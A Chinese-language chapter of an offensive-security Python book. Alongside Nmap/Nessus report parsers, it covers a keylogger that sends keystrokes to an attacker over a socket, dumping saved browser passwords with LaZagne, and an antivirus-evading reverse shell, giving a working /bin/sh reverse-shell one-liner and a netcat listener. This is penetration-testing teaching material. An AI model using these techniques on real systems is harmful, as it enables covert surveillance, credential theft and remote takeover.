# Python 的其他奇迹

网络安全是一个巨大且不断发展的领域。到目前为止，在本书中，我们已经讨论了各种使用 Python 的用例。读者可以利用这些知识进一步探索 Python 在网络安全领域中的应用场景。在这最后一章中，我们将尝试介绍一些使用 Python 的其他方法。我们将研究以下内容：

*   用 Python 解析 Nessus 和 Nmap 报告
*   用 Python 编写自定义的基于 Linux 和 Windows 的键盘记录器，并在网络上共享日志
*   解析推特推文
*   提取浏览器保存的密码
*   防病毒持久性外壳
*   绕过基于主机的防火墙

# 报表分析器

**报表解析器**是为解析报表或文件而编写的一段代码。本例中讨论的文件是 Nessus 和 Nmap 文件。以下各节将详细介绍每个功能。

# Nmap 解析器

Nmap 以各种格式（文本、CSV 和 XML）生成输出。在本节中，我们将学习如何快速轻松地解析 XML 格式的 Nmap 报告文件。我们可以使用两种方法来实现这一点：

*   第一种方法是从头开始构建解析器，并采用我们在[第 4 章](04.html)*高级 Python 模块*中讨论的相同概念，这些概念侧重于 XML 解析。
*   第二种也是推荐的方法是避免重新发明车轮。在用 Python 开发任何自动化解决方案之前，一定要养成在 internet 上搜索的习惯。Python 已经获得了惊人的社区支持，并且有许多不同的模块，不仅在网络安全领域，而且在其他更通用的用例中提供现成的解决方案。让我们使用其中一个预先构建的 Python 模块。我们将安装`libnmap`Python 模块，如下图：

```
pip3 install python-libnmap
```

接下来，创建一个名为`nmap_parser.py`的文件，并在其中放置以下代码：

![](assets/954b1411-cf2f-4281-b696-c940a034cfcf.png)

前面的代码非常简单。我们正在做的是创建一个类并将其命名为`nmap_parser`。在类的构造函数中，我们正在初始化一个`self.report_file`实例变量，该变量的文件路径包括报告的名称，用户应将该名称作为第一个参数传递给脚本。

在第 9 行中，我们初始化`NmapParser`类的实例，并传递要解析的文件的路径。它返回`NmapObject`，我们将进一步迭代以获得结果。在第 11 行中，我们从前面创建的`NmapObject`中提取`hosts()`的列表，在前面的代码中称为`report`。需要注意的是，尽管`NmapObject `返回一个列表，但每个列表元素都是`host()`类的一个对象，模块通过适当映射文件中的主机标记在内部创建该类。

在第 13 行中，我们使用`is_up()`方法检查当前正在迭代的主机是否处于活动状态。在第 15 行中，我们提取主机的所有打开端口。该方法返回我们在第 18 行中迭代的列表。内部格式为`[(``"22","ssh"),("21","ftp"``)]`。

在第 20 行中，我们调用一个`host.get_service`方法，该方法返回服务类的实例。它希望服务的端口和名称作为参数传递。

最后，在第 21 行和第 26 行之间，我们通过调用适当的实例变量和实例方法打印所有相关信息。

本模块完整的 API 文档可在官网[上找到 https://libnmap.readthedocs.io/en/latest/index.html](https://libnmap.readthedocs.io/en/latest/index.html) 。

# 运行代码

要运行代码，我们需要将其作为普通 Python 脚本调用。但是，我们还需要传递希望解析为参数的 Nmap 文件的路径/名称。我已经获取了一个示例文件`nmap.xml`，它与我们的解析器代码位于同一路径上。该文件包含针对多台主机执行的扫描报告。用于生成输出文件的`nmap`命令如下所示：

```
nmap -Pn -sS -sV -vv --max-retries 3 --max-rtt-timeout 1000ms --top-ports 1000 -oA nmap 10.228.24.1-64 
```

该报告的屏幕截图如下：

![](assets/f43b44ef-438e-410f-9889-2332ea9491eb.png)

让我们使用以下命令运行解析器代码，以查看它生成的输出：

```
python3.5 nmap_parser.py nmap.xml
```

`nmap.xml` is the name of the file placed in the same folder as the parser code. If your `report` file is at a different path, provide the absolute path as an argument to the script.

获得的输出如下所示：

![](assets/1a0201a5-cc04-4a1e-aa2c-6e5dbd2d81e1.png)

# Nessus 解析器

Nessus 还以各种格式（CSV、XML、DB 文件、JSON、HTML 等）生成输出。在本节中，我们将了解如何快速轻松地解析 XML 格式的 Nessus 报告文件。同样，我们可以手动创建自定义解析器，也可以使用现成的 Python 模块来完成这项工作，这使我们的工作变得非常简单。安装所需的模块，如下所示：

```
pip3 install python-libnessus
```

接下来，创建一个名为`Nessus_parser.py`的文件，并在其中放置以下代码：

![](assets/0e49a40e-4f72-42a2-9c38-4dcbfe9a4a3c.png)

前面的代码非常简单。我们正在做的是创建一个类并将其命名为`Nessus_parser`。在类的构造函数中，我们正在初始化一个名为`self.n_file`的实例变量，其文件路径包括报告的名称，用户应将该名称作为第一个参数传递给脚本。

在第 30 行中，我们初始化`NessusParser`类的实例，并传递要解析的文件的路径。它返回`NessusObject`，我们将进一步迭代以获得结果。在第 35 行中，我们只需调用`demo_print()`方法并将`NessusObject()`实例传递给它，其中包含我们希望迭代的主机列表。在第 12 行和第 25 行之间，我们只需迭代 Nessus 主机实例并打印相关信息。Nessus 解析器与前面讨论的 Nmap 解析器非常相似。

该类 API 的完整详细信息可在官网[上找到 https://libnessus.readthedocs.io/en/stable/](https://libnessus.readthedocs.io/en/stable/.) 。

# 运行代码

要运行代码，我们需要将其作为普通 Python 脚本调用，但我们还需要将 Nessus 文件的路径/名称作为参数进行解析。我已经获取了一个示例文件`report.nessus`，它与我们的解析器代码位于同一路径上。该文件包含针对多台主机执行的扫描报告。

报告的屏幕截图如下所示：

![](assets/08d0bb26-b71e-46f8-80cf-be3666180d24.png)

让我们使用以下命令运行解析器代码，以查看它生成的输出：

```
python3.5 Nessus_parser.py report.nessus
```

`report.nessus` is the name of the file placed in the same folder as the parser code. If your report file is at a different path, provide the absolute path as an argument to the script.

获得的输出如以下屏幕截图所示：

![](assets/8e85e498-7fb9-46b0-9297-c4defe64369c.png)

# 需要自定义解析器

我发现这些自定义解析器非常方便的一个典型用例是在客户机服务期间。在每次典型的 pen 测试之后，pen 测试人员通常会合并所有 Nessus 报告结果、Nmap 输出和手动利用该漏洞生成的 POC，并将其放入客户创建的自定义 Excel 模板中，或者使用公司报告生成门户生成合并报告。前面讨论的方法可用于自动化此过程。使用我们讨论的概念，我建议读者制作一个通用报告生成模块，该模块将整合来自 Nmap 和 Nessus 的调查结果，并将自定义 POC 屏幕截图考虑在内，以生成 Excel 和 PDF 格式的报告。

# 键盘记录器和通过插座过滤

**键盘记录器**是一款臭名昭著的软件，它记录用户按下的所有按键。它作为操作系统进程在后台静默运行。它们能够记录用户密码、浏览历史记录、机密数据等。有许多键盘记录器免费提供，随时可用。在本节中，我们将了解如何用 Python 创建功能强大的自定义键盘记录器。定制键盘记录器总是更好，因为我们可以根据需要进行定制。

Python 附带了一个非常强大的模块，称为 pyHook for Windows，在该模块的顶部有一个修改，以支持基于 Linux 的系统，称为`pyxhook`。互联网上有大量关于使用基于 Windows 的 Python 键盘记录器的教程，但关于 Linux 版本的教程却不多。在本节中，我们将重点介绍基于 Linux 的键盘记录器。我还将提供一个适用于 Windows 模块的简单代码段。

本节的目的是模拟真实世界的攻击场景，因此我们的键盘记录器不仅会将击键保存在文件中，还会在特定的时间间隔将生成的日志发送给攻击者机器。我们将探讨我们之前讨论过的套接字编程的概念如何在这里派上用场。

让我们从 GitHub 存储库安装 Linux 版本的键盘记录器模块：

```
git clone https://github.com/JeffHoogland/pyxhook.git
```

如果您想安装 Windows 版本的 Python 键盘记录器，并且您正在 Windows 环境中工作，可以使用`pip`实现，如下所示：

```
pip install pyhook
```

# pyxhook–基于 Linux 的键盘记录器

假设我们已经成功克隆了 GitHub 存储库`pyxhook`，那么让我们在下载的存储库目录中运行`cd`命令，并创建一个名为`key_logg.py`的文件，其内容如下：

```
# cd pyxhook
# gedit key_logg.py
```

键盘记录器使用下载的`pyxhook`存储库模块。如第 2 行所示，我们正在导入`pyxhook`模块。下面的代码创建了一个名为`Mylogger`的自定义类文件。它定义了一种方法`startlogin()`，其中中央逻辑触发：

![](assets/a1a84b24-c818-4bb2-83e1-a1bd6566eea7.png)

现在，在我们的`my_event`自定义方法中，我们通过调用当前的键盘事件来按下键。在第 20 行，我们检查用户是否按下了空格键，其 ASCII 键代码为 32。如果是这种情况，我们将用一个空字符串`" "`替换`space`关键字。在第 22 行中，我们更新了`self.log_string`实例变量，并将用户按下的任何键追加到该变量中。

在第 23 行中，我们检查键盘记录器终止条件，这是通过检查用户是否输入了`quitkhan`字符串来确定的。这将设置`self.running flag=False`并停止键盘记录器。如果用户未输入此字符串，键盘记录器将持续更新`self.log_string`字符串，每 5 秒后，它将使用套接字向攻击者机器发送`log_string`。这由第 25-30 行处理。向攻击者机器发送`log_string`的方法是`send_to_attacker()`方法，其定义从第 8 行开始。

在第 32 行中，我们创建了一个名为`hm`的`pyxhook`模块实例。一旦创建了`hm`实例，我们就用一个名为`self.my_event`的自定义方法绑定它。当按下一个键时，会触发`my_event`方法。在第 33 行中，我们将`hm`实例与计算机的键盘绑定，这意味着每当按下键盘上的任何键时，都会调用`keyDown`操作，这与我们的`my_event`自定义方法绑定。在第 34 行中，我们有一个无限循环，它将一直运行，直到`self.running`标志被设置为`True`。这意味着每毫秒后将调用`my_event`方法，并记录按下的击键。

需要注意的是，攻击者的 IP 和端口可以根据需要进行更改。在攻击者端，我们有一个套接字服务器，它一直监听端口`8080`并接受来自客户端的连接。无论何时收到任何数据，它都会将其放入`log_file`日志文件中。实现攻击者服务器的代码段如下所示：

![](assets/bf648c25-0961-4214-b183-986f2431c796.png)

前面的代码很简单，在*高级 Python 模块*一章的套接字编程部分已经详细讨论过。它只是打开一个套接字并侦听客户端连接。当它接收到数据时，会将其放入日志文件中。让我们运行服务器和键盘记录器，看看将记录哪些击键。

让我们按照以下顺序启动流程：

```
python3.5 server.py
python3.5 key_logg.py
```

以下屏幕截图是我们键入时记录器生成的终端输出：

![](assets/7dd3a5df-2bff-4826-ba4f-6ff13c3eae41.png)

同时，我们打开浏览器，输入[www.google.com](http://www.google.com)。我们还可以将当前窗口传递给攻击者，在其上键入数据。参考 GitHub 存储库上共享的示例，`example.py`：[https://github.com/JeffHoogland/pyxhook/blob/master/example.py](https://github.com/JeffHoogland/pyxhook/blob/master/example.py) 。

让我们看看在服务器上生成的日志文件，并分析它捕获了什么：

![](assets/989e2309-1b7c-4f1f-b531-cb4f0390c954.png)

答对 了从前面的屏幕截图可以看出，记录器成功地捕获了所有击键。请自由地进一步探索这一点；这是一种非常强大和具有破坏性的效用。

# pyhook–基于 Windows 的键盘记录器

以下是开始使用基于 Windows 的键盘记录器的代码片段：

![](assets/bff0f153-913c-4103-b72f-e1d5e87770ab.png)

从前面的屏幕截图可以看出，代码与我们之前在 Linux 用例中讨论的代码相同。前面的代码只是将所有击键记录在一个名为`mylog.txt`的文件中。但是，它不会将其发送给攻击者。至此，我们来到键盘记录器部分的末尾。

# 解析推特推文

由于处于攻击性安全领域，我们可能想知道为什么需要解析 Twitter 推文。这个问题是正确的，因为这个用例更适合防御安全。然而，如果我们的目标是特定的个人或特定的组织，那么它可能有助于发现大量的信息。

如前所述，网络情报团队可以使用 Twitter 推特解析来查看是否有任何诽谤或敏感内容以该组织的名义发布。让我们来看下面的例子，解释 Twitter 的推特解析。首先，我们需要安装 Python 模块，如下所示：

```
pip3 install tweet_parser
```

我们的示例将 Twitter 提要作为输入 JSON 文件，并解析所有 tweet 以生成输出。让我们创建一个名为`sample.py`的文件，如图所示：

![](assets/21d15e30-a1a9-4039-9ce1-c7af89368645.png)

让我们使用一个名为`exp.json`的示例 Twitter 提要文件，如下所示：

![](assets/d8a5306b-b979-40f8-92d0-0b6b2f55024a.png)

接下来，运行代码以打印所有 tweet，如下所示：

![](assets/039b2d62-486f-45ee-abdc-85ea2a4925f0.png)

在第 14 行`tweet=Tweet(tweet_dict)`、**中创建的 Twitter 类对象有许多其他方法和变量，可以提供关于推特的详细信息，如日期、时间、喜好和转发。运行`dir(tweet)`可以得到不同的支持方式，其输出如下：**

 **```
['__class__', '__contains__', '__delattr__', '__delitem__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__init__', '__iter__', '__le__', '__len__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'all_text', 'bio', 'clear', 'copy', 'created_at_datetime', 'created_at_seconds', 'created_at_string', 'embedded_tweet', 'favorite_count', 'follower_count', 'following_count', 'fromkeys', 'generator', 'geo_coordinates', 'get', 'gnip_matching_rules', 'hashtags', 'id', 'in_reply_to_screen_name', 'in_reply_to_status_id', 'in_reply_to_user_id', 'items', 'keys', 'klout_id', 'klout_influence_topics', 'klout_interest_topics', 'klout_profile', 'klout_score', 'lang', 'media_urls', 'most_unrolled_urls', 'name', 'original_format', 'poll_options', 'pop', 'popitem', 'profile_location', 'quote_count', 'quote_or_rt_text', 'quoted_tweet', 'retweet_count', 'retweeted_tweet', 'screen_name', 'setdefault', 'text', 'tweet_links', 'tweet_type', 'update', 'user_entered_text', 'user_id', 'user_mentions', 'values']
```

# 用 Python 窃取浏览器密码

Python 是一种非常强大的网络安全语言。有很多惊人的攻击性和防御性安全工具是用 Python 编写的，定制和修改它们以满足我们的需要非常容易。在本节中，我们将了解如何使用 Python 窃取存储在浏览器中的密码。再一次，由于我们已经有了这么多令人惊叹的工具，并且可以开箱即用，我们将不会重新发明轮子，而是重用已经存在的东西。让我们下载 GitHub 存储库，如图所示：

```
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZange
pip3 install -r requirement.txt
```

接下来，只需运行该工具即可查看浏览器密码，如下所示：

```
python3.5 laZagne.py browsers

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Firefox passwords -----------------

[+] Password found !!!
URL: https://www.packtpub.com
Login: b'*****'
Password: b'******'

[+] Password found !!!
URL: http://myworld.du.ae
Login: b'******'
Password: b'******'

[+] Password found !!!
URL: https://www.genymotion.com
Login: b'***********'
Password: b'*********'

[+] Password found !!!
URL: https://www.udemy.com
Login: b'*********'
Password: b'********'

[+] Password found !!!
URL: https://retail.onlinesbi.com
Login: b'*********'
Password: b'*******'

[+] Password found !!!
URL: https://www.linkedin.com
Login: b'****'
Password: b'****'

[+] Password found !!!
URL: https://login.microsoftonline.com
Login: b'****'
Password: b'****'

[+] Password found !!!
URL: https://cdp.packtpub.com
Login: b'****'
Password: b'****'

[+] Password found !!!
URL: https://www.netflix.com
Login: b'****'
Password: b'****'

[+] Password found !!!
URL: https://www.phishtank.com
Login: b'****'
Password: b'****'

[+] Password found !!!
URL: https://id.atlassian.com
Login: b'****'
Password: b'****'

[+] Password found !!!
URL: http://192.168.1.102
Login: b'****'
Password: b'****'

[+] Password found !!!
URL: https://twitter.com
Login: b'****'
Password: b'****'

[+] 59 passwords have been found.
For more information launch it again with the -v option
```

这个工具很方便。它不仅可以提取浏览器密码，还可以从以下位置提取密码：

*   `sysadmin`
*   `all`
*   `memory`
*   `wallet`
*   `chats`
*   `mails`
*   `databases`
*   `WiFi`
*   `browsers`

# Python 用于无防病毒持久性外壳

正如我们所知，规避防病毒软件的最佳技术之一是编写自定义漏洞攻击。如果该漏洞是从头开始编写的，则防病毒引擎将代码签名与已知恶意签名进行匹配的可能性很小。在本节中，我们将编写一个自定义 shell，从受害者的机器返回一个反向 shell，并查看有多少 AV 引擎可以检测到它。

让我们编写一个自定义漏洞，将其命名为`my_car.py`，并在其中放置以下代码：

![](assets/e17adf32-3de2-4d59-b1a3-b997ee0c56f2.png)

如果我们观察前面的代码，我们可以看到这是 Python 代码的一种改编，它将生成一个反向 shell 到攻击者的 IP 地址。我们正在导入 Python 模块，并在本地为导入的模块分配别名。AV 引擎主要工作在签名方法上，并且可能检测到已知签名，例如`subprocess.call["/bin/sh","-i"'\]`。在本例中，我们使用局部变量来确保攻击者的 IP、端口号、操作系统模块和其他 Python 模块未被检测到。上述代码改编自的原始代码如下所示：

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

现在让我们运行代码，看看是否得到 shell。我们将使用 Netcat 侦听器接收 shell：

```
nc -nlvp 8000
python3 my_car.py
```

执行上述命令时，会产生如下屏幕截图所示的输出：

![](assets/005f4f32-081f-49bf-a68e-694f61a4c0cb.png)

我们可以看到前面的代码运行得非常好。这对我们来说很重要，看看这是否会被任何 AV 引擎接收到。让我们使用 VirusTotal 工具进行检查，如下所示：

![](assets/1310a260-8cd5-4e90-aece-b03f27f315b8.png)

现在让我们看看我们是否被任何扫描引擎检测到：

![](assets/4ab459e3-fec5-4f28-9eb0-ca9379387868.png)

正如我们所看到的，测试的 57 个扫描引擎中没有一个检测到该文件。

值得注意的是，在编写本章的当天，我们的检测结果为零。随着时间的推移，读者可能会上传更多的示例，后端团队可能会根据代码示例更新签名，因为我已经上传了它。后端人员团队的静态分析将其标记为恶意。然而，只要稍加修改，它就能避免再次被检测到

# 总结

在本章中，我们学习了如何开发能够避免防病毒软件的自定义漏洞攻击。我们还研究了如何开发一个定制的基于 Linux 的键盘记录器，通过网络将击键发送给远程攻击者。我们还探讨了解析 Nessus 和 Nmap 报告的各种概念。我们开始了解如何使用 Python 实用程序提取浏览器密码，以及如何解析 Twitter 提要。

这一章标志着这本书的结束。我建议您更多地了解 Python，并在攻击性安全中更频繁地应用它。一个很好的起点是采用本书中讨论的所有示例、用例和漏洞利用，并使它们尽可能通用。

# 问题

1.  我们可以通过电子邮件发送键盘记录笔划吗？
2.  我们如何改进键盘记录器代码？
3.  我们如何改进持久性 shell 攻击代码？

# 进一步阅读

*   Python 键盘记录器：[https://samsclass.info/127/127_WWC_2014.shtml](https://samsclass.info/127/127_WWC_2014.shtml)
*   Python 开发援助：[https://github.com/longld/peda](https://github.com/longld/peda)
*   面纱：[https://www.veil-framework.com/veil-tutorial/](https://www.veil-framework.com/veil-tutorial/)**